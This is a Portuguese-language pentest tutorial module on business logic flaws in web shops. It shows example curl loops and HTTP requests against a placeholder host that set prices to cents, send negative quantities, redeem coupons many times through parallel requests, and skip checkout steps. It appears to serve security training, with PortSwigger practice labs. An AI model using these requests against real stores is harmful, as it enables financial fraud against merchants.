# 🧠 14. Business Logic — Vulnerabilidades de Lógica

> O scanner não acha. O pentest tradicional não acha. Vulnerabilidade de lógica é quando o sistema funciona "corretamente" — mas o resultado é errado.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 50min | ⭐⭐ Intermediário | `Burp Repeater, curl` |

</div>

---

## 🎓 Por que isso importa?

Business logic vulnerabilities ocorrem quando a aplicação permite ações que **violam regras de negócio** — como usar cupons infinitamente, manipular preços, ou pular etapas de workflow. Diferente de vulnerabilidades técnicas, **scanners automáticos não detectam** essas falhas.

**Analogia:** Imagine que um supermercado aceita cupons infinitamente. O sistema funciona perfeitamente — scan, valida, aplica desconto. Mas a regra de negócio (1 cupom por cliente) está quebrada.

**Impacto real:**
- **Fraude financeira** — obter produtos grátis, manipular preços
- **Coupon abuse** — usar cupons infinitamente
- **Workflow bypass** — pular etapas de pagamento/verificação
- **Race conditions** — executar ações simultâneas para ganho indevido

**PortSwigger:** 11 labs dedicados (Apprentice → Practitioner)

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics | Sim | Módulo 00 |
| Burp Suite (Repeater, Intruder) | Sim | Arquivo 01 deste módulo |

---

## 🎯 Quando testar Business Logic

- Quando existem **regras de negócio visíveis** (preços, cupons, limites)
- Para testar **manipulação de valores** (quantity, price, discount)
- Para testar **race conditions** (ações simultâneas)
- Para testar **workflow bypass** (pular etapas)
- Para testar **integer overflow** (valores negativos/extremos)

---

## 📝 Tipos de Business Logic

### 1. Manipulação de Preço

```bash
# Carrinho de compras original:
# Item: Camisa, Qty: 1, Price: 50.00
# Total: 50.00

# Modificar preço via Burp:
# Trocar price=50.00 por price=0.01
# Ou adicionar price=-50.00

POST /api/cart/update HTTP/1.1
Host: target.com

{"item_id":1,"quantity":1,"price":0.01}

# Se servidor aceita → comprou por R$0.01
```

### 2. Coupon Abuse

```bash
# Cupon original:
# APPLY_COUPON: DISCOUNT10 (10% de desconto, 1 uso)

# Abusar:
# 1. Usar cupom → funciona
# 2. Remover cupom do pedido
# 3. Aplicar novamente → funciona de novo

# Ou:
# Usar múltiplos cupons:
POST /api/cart/apply-coupon HTTP/1.1

coupon=DISCOUNT10
# Se aceita múltiplos cupons
```

### 3. Race Condition

```bash
# Enviar múltiplos requests simultâneos
# para a mesma ação (ex: resgate de cupom único)

# Usar Burp Intruder com threading alto
# Ou multi-curl:

for i in $(seq 1 10); do
  curl -X POST http://target.com/api/redeem-coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d "coupon=UNIQUE100" &
done
wait

# Se cupom é "único" mas foi resgatado 10x → race condition
```

### 4. Workflow Bypass (Pular Etapas)

```bash
# Fluxo normal:
# Step 1: Selecionar produto → /checkout/step1
# Step 2: Pagamento → /checkout/step2
# Step 3: Confirmação → /checkout/step3

# Bypass: acessar direto o step 3:
GET /checkout/step3 HTTP/1.1
Authorization: Bearer TOKEN

# Se aceita sem completar steps anteriores → bypass
```

### 5. Integer Overflow / Negative Values

```bash
# Quantity negativa:
POST /api/cart/add HTTP/1.1

{"item_id":1,"quantity":-1}

# Se servidor subtrai ao invés de adicionar → crédito indevido

# Quantity zero:
{"item_id":1,"quantity":0}

# Se não valida → item adicionado sem custo
```

---

## 📝 Exemplos Práticos

### Exemplo 1: Manipulação de Preço no Carrinho

```bash
# 1. Adicionar item ao carrinho
curl -X POST http://target.com/api/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"item_id":1,"quantity":1}'

# 2. Ver carrinho
curl -H "Authorization: Bearer $TOKEN" http://target.com/api/cart
# Output: {"total":50.00,"items":[{"name":"Camisa","price":50.00}]}

# 3. Interceptar request de checkout
# 4. Modificar preço:
POST /api/checkout HTTP/1.1
Host: target.com
Authorization: Bearer $TOKEN

{"items":[{"id":1,"quantity":1,"price":0.01}],"total":0.01}

# 5. Se aceita → produto por centavos
```

### Exemplo 2: Race Condition em Cupom

```bash
# Cupom é "único" — mas race condition permite usar múltiplas vezes

# Script bash para race condition:
TOKEN="your_auth_token"
for i in $(seq 1 20); do
  curl -s -X POST http://target.com/api/redeem-coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"coupon":"UNIQUE20OFF"}' &
done
wait

# Verificar saldo:
curl -H "Authorization: Bearer $TOKEN" http://target.com/api/wallet
# Se desconto aplicado mais de 1x → race condition confirmada
```

### Exemplo 3: Workflow Bypass

```bash
# Fluxo: Login → Verificar Email → Acessar Dashboard
# Bypass: acessar Dashboard direto

curl -H "Authorization: Bearer $TOKEN" http://target.com/api/dashboard
# Se retornar dados → bypass confirmado

# Ou via parâmetro:
GET /api/dashboard?skip_verification=true HTTP/1.1
```

### Exemplo 4: Negative Quantity

```bash
# Adicionar item com quantity negativa
curl -X POST http://target.com/api/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"item_id":1,"quantity":-1}'

# Ver carrinho:
curl -H "Authorization: Bearer $TOKEN" http://target.com/api/cart
# Se total diminuiu → vulnerabilidade de lógica
```

---

## 🔄 Fluxo de Teste Business Logic

```
┌─────────────────────────────────────────────────────────┐
│  1. ENTENDER REGRAS DE NEGÓCIO                           │
│     - Identificar fluxos de compra/pagamento             │
│     - Catalogar regras de cupons/descontos               │
│     - Identificar limites (qty, price, attempts)         │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. MANIPULAR PARÂMETROS                                 │
│     - Trocar preços, quantidades, descontos              │
│     - Usar valores negativos e zero                      │
│     - Testar integer overflow                            │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. TESTAR RACE CONDITIONS                               │
│     - Enviar múltiplos requests simultâneos              │
│     - Usar Burp Intruder com threading                   │
│     - Testar ações "únicas" (cupons, descontos)          │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. TESTAR WORKFLOW                                      │
│     - Pular etapas (acessar step3 sem step1/2)           │
│     - Reverter ações (após confirmação)                  │
│     - Manipular estado (pending → completed)             │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "Scanner não acha" | Business logic é manual → teste manual obrigatório |
| "Preço não modifica" | Server-side validation → testar outros parâmetros |
| "Race condition não funciona" | Threading pode ser limitado → tentar mais requests |
| "Workflow não pula" | App pode ter state machine → testar endpoints diferentes |

---

## 📋 Cheat Sheet Rápido

### Parâmetros para Manipular

```
price, cost, total, amount, discount, coupon, quantity, qty, count, units
```

### Race Condition com Burp

```
1. Enviar request para Intruder
2. Payload: NULL payload (x100)
3. Resource Pool: max concurrent = 20
4. Start attack
5. Verificar se ação foi executada múltiplas vezes
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/lab-excessive-trust-in-client-side-controls) | Client-side manipulation | 10min |
| 2 | PortSwigger | [High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/lab-high-level-logic-vulnerability) | Integer overflow | 10min |
| 3 | PortSwigger | [Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls) | Inconsistent controls | 10min |
| 4 | PortSwigger | [Flawed enforcement of business rules](https://portswigger.net/web-security/logic-flaws/lab-flawed-enforcement-of-business-rules) | Coupon abuse | 10min |
| 5 | PortSwigger | [Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/lab-low-level-logic-flaw) | Negative values | 15min |
| 6 | PortSwigger | [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/lab-insufficient-workflow-validation) | Workflow bypass | 15min |
| 7 | PortSwigger | [Flawed sale price](https://portswigger.net/web-security/logic-flaws/lab-flawed-sale-price) | Price manipulation | 15min |
| 8 | PortSwigger | [Unsafe discount](https://portswigger.net/web-security/logic-flaws/lab-unsafe-discount) | Discount abuse | 15min |

---

## 📚 Referências

- [PortSwigger — Business Logic](https://portswigger.net/web-security/logic-flaws)
- [OWASP — Business Logic](https://owasp.org/www-community/attacks/Business_logic_vulnerability)
- [HackTricks — Logic Flaws](https://book.hacktricks.xyz/pentesting-web/logic-flaws)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar regras de negócio na aplicação
- [ ] Manipular preços e quantidades
- [ ] Testar race conditions com múltiplos requests
- [ ] Bypassar workflows (pular etapas)
- [ ] Testar integer overflow e negative values
- [ ] Usar cupons de forma indevida
- [ ] Completar os labs PortSwigger de Business Logic
